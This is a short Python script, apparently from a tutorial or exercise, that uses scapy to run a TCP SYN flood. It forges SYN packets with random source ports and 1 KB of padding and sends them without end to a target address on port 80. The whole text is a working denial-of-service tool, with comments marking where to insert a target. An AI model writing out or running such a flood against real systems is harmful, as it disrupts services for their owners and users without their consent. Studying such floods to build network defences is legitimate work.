from scapy.all import *

target_ip = "192.168.100.18" # insert target ip
target_port = 80 # insert target port

# forge IP packet with target ip as the destination IP address
ip = IP(dst=target_ip)

# forge TCP SYN packet with a random source port
# and the target port as destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags='S')

# add some flooding data (hint: raw uses bytes, in our case 1KB is enough)
raw = Raw(b'X'*1024)

# stack up the layers (hint: use the / operator)
p = ip / tcp / raw

# send packets 
send(p, loop=1, verbose=0)

